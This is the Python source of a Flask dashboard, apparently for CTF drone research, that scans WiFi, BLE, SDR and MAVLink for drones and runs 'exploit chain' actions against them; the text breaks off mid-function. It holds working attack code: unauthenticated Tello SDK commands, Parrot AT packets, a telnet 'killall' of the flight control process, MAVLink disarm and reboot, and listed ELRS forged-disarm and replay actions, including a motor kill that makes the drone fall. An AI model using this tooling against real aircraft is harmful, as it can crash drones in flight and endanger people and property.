#!/usr/bin/env python3
"""
Drone Scanner Web UI

Flask application that wraps the existing recon engine and exploit chain
modules into a unified browser-based dashboard.

Usage:
    python3 -m pip install -r web/requirements.txt
    python3 web/app.py                        # default on port 5000
    python3 web/app.py --port 8080            # custom port
    python3 web/app.py --simulate             # demo mode, no hardware

For authorized CTF research only.
"""

from __future__ import annotations

import argparse
from copy import deepcopy
from dataclasses import dataclass, field
import json
import os
import socket
import subprocess
import sys
import threading
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Generator

from flask import (
    Blueprint,
    Flask,
    Response,
    current_app,
    has_app_context,
    jsonify,
    render_template,
    request,
)

TOOLS_DIR = Path(__file__).resolve().parent.parent / "tools"
sys.path.insert(0, str(TOOLS_DIR))
sys.path.insert(0, str(TOOLS_DIR / "exploit_chains"))

from exploit_chains.common import ChainLogger, AbortHandler

MAX_EVENTS = 500
MAX_LOG = 200
DEFAULT_PROTOCOLS = ("wifi", "ble", "sdr", "mavlink", "telemetry")
VALID_PROTOCOLS = frozenset(DEFAULT_PROTOCOLS)
STATE_EXTENSION_KEY = "dashboard_state"


def _new_scanner_status() -> dict[str, str]:
    return {name: "idle" for name in DEFAULT_PROTOCOLS}


def _new_scan_defaults() -> dict[str, str]:
    return {
        "wifi_iface": "wlan0",
        "ble_iface": "hci0",
        "sdr_args": "driver=uhd",
    }


def _new_chain2_state() -> dict[str, Any]:
    return {
        "status": "idle",
        "proxy_running": False,
        "proxy_stats": {},
        "evil_twin": None,
        "last_injection": None,
        "injections": [],
    }


@dataclass
class DashboardState:
    """Mutable runtime state owned by exactly one Flask application.

    Scan-owned fields use ``scan_lock`` and event fields use ``events_lock``.
    R1 establishes instance ownership; R2 will tighten locking and retention for
    every history. Static protocol/action definitions remain module constants.
    """

    scan_lock: Any = field(default_factory=threading.RLock, repr=False)
    targets: dict[str, dict[str, Any]] = field(default_factory=dict)
    action_log: list[dict[str, Any]] = field(default_factory=list)
    scanner_status: dict[str, str] = field(default_factory=_new_scanner_status)
    is_scanning: bool = False
    simulate_mode: bool = False
    dry_run_mode: bool = True
    hw_status: dict[str, Any] = field(default_factory=dict)
    events: list[dict[str, Any]] = field(default_factory=list)
    events_lock: Any = field(default_factory=threading.Lock, repr=False)
    next_event_id: int = 0
    scan_defaults: dict[str, str] = field(default_factory=_new_scan_defaults)
    chain2_state: dict[str, Any] = field(default_factory=_new_chain2_state)

    def reset_runtime(self) -> None:
        """Reset this instance without changing its mode or scan defaults."""
        with self.scan_lock:
            self.targets.clear()
            self.action_log.clear()
            self.scanner_status = _new_scanner_status()
            self.is_scanning = False
            self.hw_status = {}
            self.chain2_state = _new_chain2_state()
        with self.events_lock:
            self.events.clear()
            self.next_event_id = 0


dashboard = Blueprint("dashboard", __name__)


def create_dashboard_state(
        *, simulate: bool = False, dry_run: bool = True,
        scan_defaults: dict[str, str] | None = None) -> DashboardState:
    """Create isolated state for one dashboard application instance."""
    state = DashboardState(simulate_mode=simulate, dry_run_mode=dry_run)
    if scan_defaults:
        state.scan_defaults.update(scan_defaults)
    return state


def get_dashboard_state(flask_app: Flask | None = None) -> DashboardState:
    """Return state for an explicit app, the request app, or the default app."""
    if flask_app is None:
        flask_app = current_app._get_current_object() if has_app_context() else app
    state = flask_app.extensions.get(STATE_EXTENSION_KEY)
    if not isinstance(state, DashboardState):
        raise RuntimeError("Dashboard state is not installed on this application")
    return state


def _push_event(
        state: DashboardState, event_type: str, data: dict[str, Any]) -> None:
    with state.events_lock:
        event_id = state.next_event_id
        state.next_event_id += 1
        state.events.append({
            "id": event_id,
            "type": event_type,
            "data": data,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })
        if len(state.events) > MAX_EVENTS:
            del state.events[:len(state.events) - MAX_EVENTS]


def _finish_scan(state: DashboardState) -> None:
    """Release the scan slot and resolve any stale in-progress statuses."""
    with state.scan_lock:
        for name, scanner_state in state.scanner_status.items():
            if scanner_state == "scanning":
                state.scanner_status[name] = "error"
        state.is_scanning = False


# --- Hardware detection ---

def simulated_hardware_status() -> dict[str, Any]:
    """Return deterministic status without touching host hardware or sockets."""
    note = "Simulation mode: hardware probe disabled"
    return {
        "mode": "simulation",
        "probe_performed": False,
        "wifi": {
            "available": False,
            "status": "not_checked",
            "interfaces": [],
            "default": None,
            "note": note,
        },
        "ble": {
            "available": False,
            "status": "not_checked",
            "interfaces": [],
            "default": None,
            "note": note,
        },
        "sdr": {
            "available": False,
            "status": "not_checked",
            "devices": [],
            "default_args": "",
            "note": note,
        },
        "mavlink": {
            "available": False,
            "status": "not_checked",
            "bindable_ports": [],
            "note": "Simulation mode: UDP listener readiness not checked",
        },
    }


def detect_hardware() -> dict[str, Any]:
    """Probe for available scanner hardware and return an uncached snapshot."""
    checks: dict[str, Any] = {
        "mode": "live",
        "probe_performed": True,
    }

    # WiFi interface
    try:
        result = subprocess.run(
            ["nmcli", "-t", "-f", "DEVICE,TYPE,STATE", "device"],
            capture_output=True, text=True, timeout=5,
        )
        wifi_devs = [
            line.split(":")[0]
            for line in result.stdout.splitlines()
            if ":wifi:" in line and "connected" in line.lower() or ":wifi:" in line
        ]
        if not wifi_devs:
            result2 = subprocess.run(
                ["ip", "link", "show"], capture_output=True, text=True, timeout=5,
            )
            for line in result2.stdout.splitlines():
                if "wlan" in line or "wlp" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        wifi_devs.append(parts[1].strip())
        checks["wifi"] = {
            "available": bool(wifi_devs),
            "interfaces": wifi_devs,
            "default": wifi_devs[0] if wifi_devs else None,
        }
    except (FileNotFoundError, subprocess.TimeoutExpired):
        checks["wifi"] = {"available": False, "interfaces": [], "error": "nmcli/ip not found"}

    # BLE
    try:
        result = subprocess.run(
            ["hciconfig"], capture_output=True, text=True, timeout=5,
        )
        ble_devs = []
        for line in result.stdout.splitlines():
            if line and not line.startswith("\t") and ":" in line:
                ble_devs.append(line.split(":")[0])
        checks["ble"] = {
            "available": bool(ble_devs),
            "interfaces": ble_devs,
            "default": ble_devs[0] if ble_devs else None,
        }
    except (FileNotFoundError, subprocess.TimeoutExpired):
        try:
            import importlib
            bleak_spec = importlib.util.find_spec("bleak")
            checks["ble"] = {
                "available": bleak_spec is not None,
                "interfaces": ["bleak"],
                "default": "bleak" if bleak_spec else None,
                "note": "Using bleak library",
            }
        except Exception:
            checks["ble"] = {"available": False, "interfaces": [], "error": "No BLE stack found"}

    # SDR (SoapySDR)
    try:
        import SoapySDR
        devs = SoapySDR.Device.enumerate()
        dev_labels = [d.get("label", d.get("driver", "unknown")) for d in devs]
        checks["sdr"] = {
            "available": bool(devs),
            "devices": dev_labels,
            "default_args": "driver=uhd" if any("uhd" in str(d) for d in devs) else "",
        }
    except ImportError:
        checks["sdr"] = {"available": False, "devices": [], "error": "SoapySDR not installed"}
    except Exception as e:
        checks["sdr"] = {"available": False, "devices": [], "error": str(e)}

    # MAVLink UDP (check common ports for traffic)
    mavlink_ports = []
    for port in [14550, 14555, 5760]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(0.5)
            sock.bind(("0.0.0.0", port))
            sock.close()
            mavlink_ports.append(port)
        except OSError:
            pass
    listener_ready = bool(mavlink_ports)
    checks["mavlink"] = {
        "available": listener_ready,
        "status": "listener_ready" if listener_ready else "unavailable",
        "bindable_ports": mavlink_ports,
        "note": "UDP listener readiness only; no peer or hardware was detected",
    }

    return checks


# --- Simulated scanner data ---

SIMULATED_TARGETS = [
    {
        "id": "wifi:60:60:1F:AA:BB:CC",
        "protocol": "wifi",
        "name": "TELLO-AABBCC",
        "type": "Ryze Tello",
        "drone_type": "tello",
        "signal": -45,
        "encryption": "Open",
        "threat_level": "HIGH",
        "vulns": ["OPEN_WIFI", "KNOWN_DEFAULT_CREDS", "UDP_SDK_EXPOSED"],
        "details": {
            "bssid": "60:60:1F:AA:BB:CC",
            "channel": 6,
            "ip": "192.168.10.1",
            "sdk_port": 8889,
            "video_port": 11111,
        },
        "available_actions": ["land", "emergency", "takeoff", "streamon", "rc_zero"],
        "chain": "wifi_tello",
    },
    {
        "id": "wifi:A0:14:3D:11:22:33",
        "protocol": "wifi",
        "name": "ardrone2_044833",
        "type": "Parrot AR.Drone 2",
        "drone_type": "parrot_ar",
        "signal": -62,
        "encryption": "Open",
        "threat_level": "HIGH",
        "vulns": ["OPEN_WIFI", "ROOT_TELNET", "NO_AUTH"],
        "details": {
            "bssid": "A0:14:3D:11:22:33",
            "channel": 11,
            "ip": "192.168.1.1",
            "telnet_port": 23,
            "at_command_port": 5556,
        },
        "available_actions": ["land", "emergency_watchdog", "kill_control"],
        "chain": "wifi_parrot",
    },
    {
        "id": "mav:1:1",
        "protocol": "mavlink",
        "name": "MAVLink Quadrotor (sys=1)",
        "type": "QUADROTOR",
        "drone_type": "mavlink",
        "signal": None,
        "encryption": "None",
        "threat_level": "CRITICAL",
        "vulns": ["NO_MSG_SIGNING", "IN_FLIGHT", "ARMED"],
        "details": {
            "sysid": 1,
            "compid": 1,
            "autopilot": "ArduPilot",
            "mav_version": 2,
            "armed": True,
            "state": "ACTIVE",
            "mode": "STABILIZE",
            "source": "192.168.1.100:14550",
            "signed": False,
            "lat": 37.7749,
            "lon": -122.4194,
            "alt_m": 52.3,
        },
        "available_actions": ["disarm", "land", "rtl", "reboot"],
        "chain": "mavlink",
    },
    {
        "id": "elrs:A1:B2:C3",
        "protocol": "elrs",
        "name": "ELRS TX (UID A1:B2:C3)",
        "type": "ExpressLRS Transmitter",
        "drone_type": "elrs",
        "signal": -71,
        "encryption": "Binding Phrase",
        "threat_level": "MEDIUM",
        "vulns": ["BINDING_PHRASE_KNOWN", "FHSS_PREDICTABLE"],
        "details": {
            "uid_fragment": "A1:B2:C3",
            "freq_band": "2.4 GHz ISM",
            "rate": "250Hz",
            "fhss_channels": 80,
            "rainbow_match": True,
            "binding_phrase": "iloveflying",
            "ota_version": 3,
        },
        "available_actions": ["forge_disarm", "preview_fhss", "scan_deeper"],
        "chain": "elrs",
    },
    {
        "id": "ble:48:1C:B9:DE:AD:01",
        "protocol": "ble",
        "name": "DJI-Mavic3-BLE",
        "type": "DJI Mavic 3 (BLE)",
        "drone_type": "dji_ble",
        "signal": -78,
        "encryption": "BLE Pairing",
        "threat_level": "LOW",
        "vulns": ["BLE_EXPOSED"],
        "details": {
            "address": "48:1C:B9:DE:AD:01",
            "manufacturer": "DJI Technology",
            "services": ["FPV Stream", "Remote ID"],
        },
        "available_actions": ["ble_scan_services"],
        "chain": "dji_ble",
    },
]

# Action definitions per chain
ACTION_DEFS = {
    "land": {
        "label": "Force Land",
        "description": "Send immediate landing command",
        "severity": "warning",
        "category": "active",
        "icon": "arrow-down",
    },
    "emergency": {
        "label": "Emergency Stop",
        "description": "Kill all motors immediately (drone falls)",
        "severity": "danger",
        "category": "active",
        "icon": "x-octagon",
    },
    "takeoff": {
        "label": "Takeoff",
        "description": "Command drone to take off",
        "severity": "warning",
        "category": "active",
        "icon": "arrow-up",
    },
    "streamon": {
        "label": "Capture Video",
        "description": "Enable video stream from drone camera",
        "severity": "info",
        "category": "passive",
        "icon": "video",
    },
    "rc_zero": {
        "label": "Zero RC",
        "description": "Set all RC inputs to zero (hover/stop)",
        "severity": "warning",
        "category": "active",
        "icon": "pause",
    },
    "disarm": {
        "label": "Disarm Motors",
        "description": "Disarm the flight controller motors",
        "severity": "danger",
        "category": "active",
        "icon": "shield-off",
    },
    "rtl": {
        "label": "Return to Launch",
        "description": "Command drone to return to its launch position",
        "severity": "warning",
        "category": "active",
        "icon": "home",
    },
    "reboot": {
        "label": "Reboot FC",
        "description": "Reboot the flight controller",
        "severity": "danger",
        "category": "active",
        "icon": "refresh-cw",
    },
    "emergency_watchdog": {
        "label": "Watchdog Reset",
        "description": "Send AT*COMWDG watchdog reset (Parrot)",
        "severity": "danger",
        "category": "active",
        "icon": "alert-triangle",
    },
    "kill_control": {
        "label": "Kill Control Process",
        "description": "Kill the drone's main control process via Telnet",
        "severity": "danger",
        "category": "active",
        "icon": "x-circle",
    },
    "forge_disarm": {
        "label": "Forge Disarm Packet",
        "description": "Build forged RC disarm packet using recovered binding params",
        "severity": "danger",
        "category": "simulated",
        "icon": "zap",
    },
    "preview_fhss": {
        "label": "Preview FHSS Sequence",
        "description": "Show the computed FHSS hop sequence",
        "severity": "info",
        "category": "simulated",
        "icon": "radio",
    },
    "scan_deeper": {
        "label": "Deep ELRS Scan",
        "description": "Extended scan for SYNC packet capture",
        "severity": "info",
        "category": "passive",
        "icon": "search",
    },
    "ble_scan_services": {
        "label": "Scan BLE Services",
        "description": "Enumerate BLE GATT services and characteristics",
        "severity": "info",
        "category": "passive",
        "icon": "bluetooth",
    },
    "replay": {
        "label": "Replay Packets",
        "description": "Replay captured MAVLink packets (works against weak signing)",
        "severity": "danger",
        "category": "active",
        "icon": "repeat",
    },
    "sniff": {
        "label": "Sniff Traffic",
        "description": "Capture and analyze MAVLink traffic",
        "severity": "info",
        "category": "passive",
        "icon": "activity",
    },
}


def run_scan_simulated(
        state: DashboardState, protocols: list[str] | None = None) -> None:
    """Run a simulated scan for demo mode."""
    import random

    requested = set(protocols or DEFAULT_PROTOCOLS)
    try:
        with state.scan_lock:
            state.scanner_status = {
                name: "scanning" if name in requested else "idle"
                for name in DEFAULT_PROTOCOLS
            }
        _push_event(
            state, "scan_start",
            {"mode": "simulate", "protocols": sorted(requested)},
        )

        for scanner_name, delay in (
                ("wifi", 1.0), ("ble", 0.6), ("sdr", 0.8),
                ("mavlink", 0.6), ("telemetry", 0.6)):
            if scanner_name not in requested:
                continue
            time.sleep(delay)
            state.scanner_status[scanner_name] = "done"
            _push_event(state, "scanner_done", {"scanner": scanner_name})

        with state.scan_lock:
            now = time.time()
            for t in SIMULATED_TARGETS:
                protocol = t.get("protocol")
                if protocol == "elrs":
                    selected = "sdr" in requested or "telemetry" in requested
                else:
                    selected = protocol in requested
                if not selected:
                    continue
                target = deepcopy(t)
                target["first_seen"] = now - random.uniform(0, 10)
                target["last_seen"] = now
                target["score"] = _score_target(target)
                target["threat_level"] = _threat_from_score(target)
                state.targets[target["id"]] = target
                _push_event(
                    state, "target_found",
                    {
                        "id": target["id"],
                        "name": target["name"],
                        "protocol": target["protocol"],
                    },
                )

        state.scanner_status = _new_scanner_status()
        _push_event(
            state, "scan_complete",
            {"target_count": len(state.targets), "mode": "simulate"},
        )
    finally:
        _finish_scan(state)


def run_scan_live(
        state: DashboardState, protocols: list[str],
        config: dict[str, Any]) -> None:
    """Run live scanning using the real scanner backends."""
    all_targets = []
    scan_errors = {}

    try:
        from exploit_chains.multi_recon import scan_wifi, scan_ble, scan_sdr

        logger = ChainLogger("web-scan")
        abort = AbortHandler(logger)
        _push_event(state, "scan_start", {"mode": "live", "protocols": protocols})

        wifi_iface = config.get("wifi_iface", "wlan0")
        ble_iface = config.get("ble_iface", "hci0")
        sdr_args = config.get("sdr_args", "driver=uhd")
        scan_time = config.get("scan_time", 15.0)

        if "wifi" in protocols:
            state.scanner_status["wifi"] = "scanning"
            _push_event(state, "scanner_start", {"scanner": "wifi", "interface": wifi_iface})
            try:
                wifi_results = scan_wifi(wifi_iface, scan_time, logger, abort)
                all_targets.extend(wifi_results)
                _push_event(state, "scanner_done", {"scanner": "wifi", "count": len(wifi_results)})
            except Exception as e:
                scan_errors["wifi"] = str(e)
                _push_event(state, "scanner_error", {"scanner": "wifi", "error": str(e)})
            state.scanner_status["wifi"] = "done" if "wifi" not in scan_errors else "error"

        if "ble" in protocols:
            state.scanner_status["ble"] = "scanning"
            _push_event(state, "scanner_start", {"scanner": "ble", "interface": ble_iface})
            try:
                ble_results = scan_ble(ble_iface, scan_time, logger, abort)
                all_targets.extend(ble_results)
                _push_event(state, "scanner_done", {"scanner": "ble", "count": len(ble_results)})
            except Exception as e:
                scan_errors["ble"] = str(e)
                _push_event(state, "scanner_error", {"scanner": "ble", "error": str(e)})
            state.scanner_status["ble"] = "done" if "ble" not in scan_errors else "error"

        if "sdr" in protocols:
            state.scanner_status["sdr"] = "scanning"
            _push_event(state, "scanner_start", {"scanner": "sdr", "args": sdr_args})
            try:
                sdr_results = scan_sdr(sdr_args, scan_time, logger, abort)
                all_targets.extend(sdr_results)
                _push_event(state, "scanner_done", {"scanner": "sdr", "count": len(sdr_results)})
            except Exception as e:
                scan_errors["sdr"] = str(e)
                _push_event(state, "scanner_error", {"scanner": "sdr", "error": str(e)})
            state.scanner_status["sdr"] = "done" if "sdr" not in scan_errors else "error"

        if "mavlink" in protocols:
            state.scanner_status["mavlink"] = "scanning"
            _push_event(state, "scanner_start", {"scanner": "mavlink"})
            try:
                mav_results = _scan_mavlink_udp(scan_time, logger, abort)
                all_targets.extend(mav_results)
                _push_event(state, "scanner_done", {"scanner": "mavlink", "count": len(mav_results)})
            except Exception as e:
                scan_errors["mavlink"] = str(e)
                _push_event(state, "scanner_error", {"scanner": "mavlink", "error": str(e)})
            state.scanner_status["mavlink"] = "done" if "mavlink" not in scan_errors else "error"

        if "telemetry" in protocols:
            state.scanner_status["telemetry"] = "scanning"
            _push_event(state, "scanner_start", {"scanner": "telemetry"})
            try:
                telem_results = _scan_passive_telemetry(sdr_args, scan_time, logger, abort)
                all_targets.extend(telem_results)
                _push_event(state, "scanner_done", {"scanner": "telemetry", "count": len(telem_results)})
            except Exception as e:
                scan_errors["telemetry"] = str(e)
                _push_event(state, "scanner_error", {"scanner": "telemetry", "error": str(e)})
            state.scanner_status["telemetry"] = "done" if "telemetry" not in scan_errors else "error"

        with state.scan_lock:
            now = time.time()
            for t in all_targets:
                tid = _make_target_id(t)
                target = _convert_recon_target(t, tid, now)
                state.targets[tid] = target
                _push_event(state, "target_found", {"id": tid, "name": target["name"], "protocol": target["protocol"]})

        time.sleep(1)
        state.scanner_status.update({k: "idle" for k in state.scanner_status})

        _push_event(state, "scan_complete", {
            "target_count": len(state.targets),
            "mode": "live",
            "errors": scan_errors if scan_errors else None,
        })
    finally:
        _finish_scan(state)


def _scan_mavlink_udp(timeout: float, logger: ChainLogger, abort: AbortHandler) -> list[dict[str, Any]]:
    """Scan common MAVLink UDP ports for traffic (pure UDP, no SDR needed)."""
    from exploit_chains.mavlink_chain import parse_mavlink_packet, parse_heartbeat

    results = []
    for port in [14550, 14555, 14560, 5760, 5762, 5763]:
        abort.check()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(min(timeout / 3, 3.0))
        try:
            sock.bind(("0.0.0.0", port))
            data, addr = sock.recvfrom(4096)
            pkt = parse_mavlink_packet(data)
            if pkt:
                hb = None
                if pkt["msg_id"] == 0:
                    hb = parse_heartbeat(pkt["payload"])
                results.append({
                    "protocol": "mavlink_udp",
                    "description": f"MAVLink v{pkt['version']} on port {port}",
                    "source": f"{addr[0]}:{addr[1]}",
                    "port": port,
                    "signed": pkt["signed"],
                    "sys_id": pkt["sys_id"],
                    "heartbeat": hb,
                    "drone_type": "mavlink",
                    "chain": "mavlink_chain",
                })
                logger.success("MAVLINK", f"Found MAVLink on port {port} from {addr[0]}:{addr[1]}")
        except (socket.timeout, OSError):
            pass
        finally:
            sock.close()
    return results


def _scan_passive_telemetry(sdr_args: str, timeout: float, logger: ChainLogger, abort: AbortHandler) -> list[dict[str, Any]]:
    """Quick passive telemetry scan on 2.4 GHz for CRSF/ELRS frames."""
    try:
        import SoapySDR
        import numpy as np
    except ImportError:
        logger.warn("TELEMETRY", "SoapySDR/numpy not available — skipping passive telemetry scan")
        return []

    results = []
    try:
        sdr = SoapySDR.Device(
            dict(x.split("=") for x in sdr_args.split(",") if "=" in x) if sdr_args else {}
        )
    except Exception as e:
        logger.warn("TELEMETRY", f"SDR open failed: {e}")
        return results

    sample_rate = 2.5e6
    sdr.setSampleRate(SoapySDR.SOAPY_SDR_RX, 0, sample_rate)
    sdr.setGain(SoapySDR.SOAPY_SDR_RX, 0, 40)

    rx_stream = sdr.setupStream(SoapySDR.SOAPY_SDR_RX, SoapySDR.SOAPY_SDR_CF32)
    sdr.activateStream(rx_stream)

    buf = np.zeros(4096, dtype=np.complex64)
    channel_hits = {}
    end_time = time.time() + min(timeout, 10)

    while time.time() < end_time:
        abort.check()
        for freq_mhz in range(2400, 2481, 4):
            if time.time() > end_time:
                break
            sdr.setFrequency(SoapySDR.SOAPY_SDR_RX, 0, freq_mhz * 1e6)
            time.sleep(0.003)
            sr = sdr.readStream(rx_stream, [buf], len(buf), timeoutUs=50000)
            if sr.ret > 0:
                power = float(np.mean(np.abs(buf[:sr.ret]) ** 2))
                if power > 0.001:
                    channel_hits[freq_mhz] = channel_hits.get(freq_mhz, 0) + 1

    sdr.deactivateStream(rx_stream)
    sdr.closeStream(rx_stream)

    active_channels = [f for f, c in channel_hits.items() if c >= 2]
    if len(active_channels) >= 5:
        results.append({
            "protocol": "elrs",
            "description": f"ELRS-like FHSS ({len(active_channels)} active channels)",
            "active_channels": active_channels,
            "drone_type": "elrs",
            "chain": "elrs_chain",
        })
        logger.success("TELEMETRY", f"Passive telemetry: ELRS FHSS on {len(active_channels)} channels")

    return results


def _make_target_id(t: dict[str, Any]) -> str:
    proto = t.get("protocol", "unknown")
    if proto == "wifi":
        return f"wifi:{t.get('ssid', uuid.uuid4().hex[:8])}"
    elif proto == "ble":
        return f"ble:{t.get('address', uuid.uuid4().hex[:8])}"
    elif proto in ("elrs",):
        return f"elrs:{uuid.uuid4().hex[:6]}"
    elif proto in ("mavlink_udp", "sik_915", "sik_433"):
        return f"mav:{t.get('port', 0)}"
    return f"unknown:{uuid.uuid4().hex[:8]}"


def _convert_recon_target(t: dict[str, Any], tid: str, now: float) -> dict[str, Any]:
    proto = t.get("protocol", "unknown")
    dtype = t.get("drone_type", "unknown")
    chain_map = {
        "ble": "dji_ble",
        "elrs": "elrs",
        "mavlink_udp": "mavlink",
        "sik_915": "mavlink",
        "sik_433": "mavlink",
    }
    if proto == "wifi":
        if dtype in ("parrot", "parrot_ar", "parrot_anafi"):
            chain = "wifi_parrot"
        elif dtype == "tello":
            chain = "wifi_tello"
        else:
            chain = "unknown"
    else:
        chain = chain_map.get(proto, "unknown")
    action_map = {
        "wifi_tello": ["land", "emergency", "takeoff", "streamon"],
        "wifi_parrot": ["land", "emergency_watchdog", "kill_control"],
        "mavlink": ["sniff", "disarm", "land", "rtl", "reboot", "replay"],
        "elrs": ["forge_disarm", "preview_fhss", "scan_deeper"],
        "dji_ble": ["ble_scan_services"],
    }
    score = _score_target(t)
    return {
        "id": tid,
        "protocol": proto,
        "name": t.get("ssid") or t.get("name") or t.get("description", "Unknown"),
        "type": t.get("description", "Unknown"),
        "drone_type": dtype,
        "signal": None,
        "encryption": t.get("encryption", "Unknown"),
        "threat_level": _threat_from_score({"score": score}),
        "vulns": _detect_vulns(t),
        "details": t,
        "available_actions": action_map.get(chain, []),
        "chain": chain,
        "first_seen": now,
        "last_seen": now,
        "score": score,
    }


def _detect_vulns(t: dict[str, Any]) -> list[str]:
    vulns: list[str] = []
    if t.get("is_open"):
        vulns.append("OPEN_WIFI")
    if t.get("signed") is False:
        vulns.append("NO_MSG_SIGNING")
    dtype = t.get("drone_type", "")
    if dtype == "tello":
        vulns.extend(["UDP_SDK_EXPOSED", "KNOWN_DEFAULT_CREDS"])
    elif dtype == "parrot_ar":
        vulns.extend(["ROOT_TELNET", "NO_AUTH"])
    elif dtype == "elrs":
        vulns.append("FHSS_PREDICTABLE")
    elif dtype in ("dji_ble", "esp32"):
        vulns.append("BLE_EXPOSED")
    return vulns


def _threat_from_score(t: dict[str, Any]) -> str:
    score = t.get("score", 50)
    if score >= 80:
        return "CRITICAL"
    if score >= 60:
        return "HIGH"
    if score >= 40:
        return "MEDIUM"
    return "LOW"


EXPLOITABILITY_SCORES = {
    "tello": 95, "parrot_ar": 90, "parrot": 80, "parrot_anafi": 70,
    "dji": 40, "dji_ble": 60, "esp32": 55, "toy": 85,
    "elrs": 65, "mavlink": 75, "mavlink_udp": 75,
    "sik_915": 50, "sik_433": 50, "unknown": 30,
}


def _score_target(t: dict[str, Any]) -> int:
    dtype = t.get("drone_type", "unknown")
    base = EXPLOITABILITY_SCORES.get(dtype, 30)
    if t.get("is_open"):
        base = min(100, base + 10)
    if t.get("signed") is False:
        base = min(100, base + 15)
    return base


# --- Action execution ---

def execute_action_simulated(
        state: DashboardState, target: dict[str, Any],
        action_name: str) -> dict[str, Any]:
    """Simulate executing an action (dry-run only)."""
    action_def = ACTION_DEFS.get(action_name, {})
    entry = {
        "id": uuid.uuid4().hex[:8],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target_id": target["id"],
        "target_name": target["name"],
        "action": action_name,
        "label": action_def.get("label", action_name),
        "status": "dry_run",
        "result": f"[DRY-RUN] Would execute: {action_def.get('description', action_name)}",
    }
    state.action_log.append(entry)
    if len(state.action_log) > MAX_LOG:
        del state.action_log[:len(state.action_log) - MAX_LOG]
    _push_event(state, "action_executed", entry)
    return entry


def execute_action_live(
        state: DashboardState, target: dict[str, Any],
        action_name: str) -> dict[str, Any]:
    """Execute an action using the real exploit chain tools."""
    chain = target.get("chain", "")
    details = target.get("details", {})
    action_def = ACTION_DEFS.get(action_name, {})

    entry = {
        "id": uuid.uuid4().hex[:8],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target_id": target["id"],
        "target_name": target["name"],
        "action": action_name,
        "label": action_def.get("label", action_name),
    }

    try:
        if chain == "wifi_tello":
            result = _exec_wifi_tello(target, action_name, details)
        elif chain == "wifi_parrot":
            result = _exec_wifi_parrot(target, action_name, details)
        elif chain == "mavlink":
            result = _exec_mavlink(target, action_name, details)
        elif chain == "elrs":
            result = _exec_elrs(target, action_name, details)
        elif chain == "dji_ble":
            result = _exec_ble(target, action_name, details)
        else:
            result = {"status": "error", "message": f"No handler for chain '{chain}'"}

        entry["status"] = result.get("status", "executed")
        entry["result"] = result.get("message", "Action completed")
        if "data" in result:
            entry["data"] = result["data"]

    except Exception as e:
        entry["status"] = "error"
        entry["result"] = f"Action failed: {e}"

    state.action_log.append(entry)
    if len(state.action_log) > MAX_LOG:
        del state.action_log[:len(state.action_log) - MAX_LOG]
    _push_event(state, "action_executed", entry)
    return entry


def _exec_wifi_tello(target: dict[str, Any], action_name: str, details: dict[str, Any]) -> dict[str, Any]:
    """Execute Tello SDK commands over UDP."""
    from exploit_chains.wifi_tello_chain import TELLO_COMMANDS

    target_ip = details.get("ip", "192.168.10.1")
    tello_port = details.get("sdk_port", 8889)

    if action_name not in TELLO_COMMANDS:
        return {"status": "error", "message": f"Unknown Tello command: {action_name}"}

    sdk_cmd, desc = TELLO_COMMANDS[action_name]

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)

    try:
        # Enter SDK mode first
        sock.sendto(b"command", (target_ip, tello_port))
        try:
            resp, _ = sock.recvfrom(1024)
            sdk_resp = resp.decode("utf-8", errors="replace")
        except socket.timeout:
            sdk_resp = "(no response)"

        sock.sendto(sdk_cmd.encode(), (target_ip, tello_port))
        try:
            resp, _ = sock.recvfrom(1024)
            cmd_resp = resp.decode("utf-8", errors="replace")
        except socket.timeout:
            cmd_resp = "(no response)"

        return {
            "status": "executed",
            "message": f"Sent '{sdk_cmd}' to {target_ip}:{tello_port} — Response: {cmd_resp}",
            "data": {"sdk_mode": sdk_resp, "command_response": cmd_resp},
        }
    except Exception as e:
        return {"status": "error", "message": f"Tello command failed: {e}"}
    finally:
        sock.close()


def _exec_wifi_parrot(target: dict[str, Any], action_name: str, details: dict[str, Any]) -> dict[str, Any]:
    """Execute Parrot drone commands via Telnet / AT commands."""
    target_ip = details.get("ip", "192.168.1.1")

    if action_name == "land":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.sendto(b"AT*COMWDG=1\r", (target_ip, 5556))
            sock.sendto(b'AT*REF=1,290717696\r', (target_ip, 5556))
            return {"status": "executed", "message": f"Landing command sent to {target_ip}:5556"}
        finally:
            sock.close()
    elif action_name == "emergency_watchdog":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.sendto(b"AT*COMWDG=1\r", (target_ip, 5556))
            return {"status": "executed", "message": f"Watchdog reset sent to {target_ip}:5556"}
        finally:
            sock.close()
    elif action_name == "kill_control":
        try:
            import telnetlib
            tn = telnetlib.Telnet(target_ip, 23, timeout=5)
            tn.write(b"killall program.elf\n")
            tn.close()
            return {"status": "executed", "message": f"Control process killed on {target_ip}"}
        except ImportError:
            return {"status": "error", "message": "telnetlib unavailable in this Python version"}
        except Exception as e:
            return {"status": "error", "message": f"Telnet failed: {e}"}

    return {"status": "error", "message": f"Unknown Parrot action: {action_name}"}


def _exec_mavlink(target: dict[str, Any], action_name: str, details: dict[str, Any]) -> dict[str, Any]:
    """Execute MAVLink commands (injection or sniff)."""
    from exploit_chains.mavlink_chain import (
        build_command_long, sniff_mavlink, parse_mavlink_packet,
        MAV_CMD_ARM_DISARM, MAV_CMD_NAV_LAND, MAV_CMD_NAV_RTL, MAV_CMD_REBOOT,
    )

    source = details.get("source", "")
    port = details.get("port", 14550)
    sys_id = details.get("sys_id", details.get("sysid", 1))

    if source:
        parts = source.split(":")
        target_str = f"udp:{parts[0]}:{port}"
    else:
        target_str = f"udp:0.0.0.0:{port}"

    if action_name == "sniff":
        logger = ChainLogger("web-mavlink-sniff")
        abort = AbortHandler(logger)
        result = sniff_mavlink(target_str, 5.0, logger, abort)
        return {
            "status": "executed",
            "message": (
                f"Captured {result['packets_captured']} packets, "
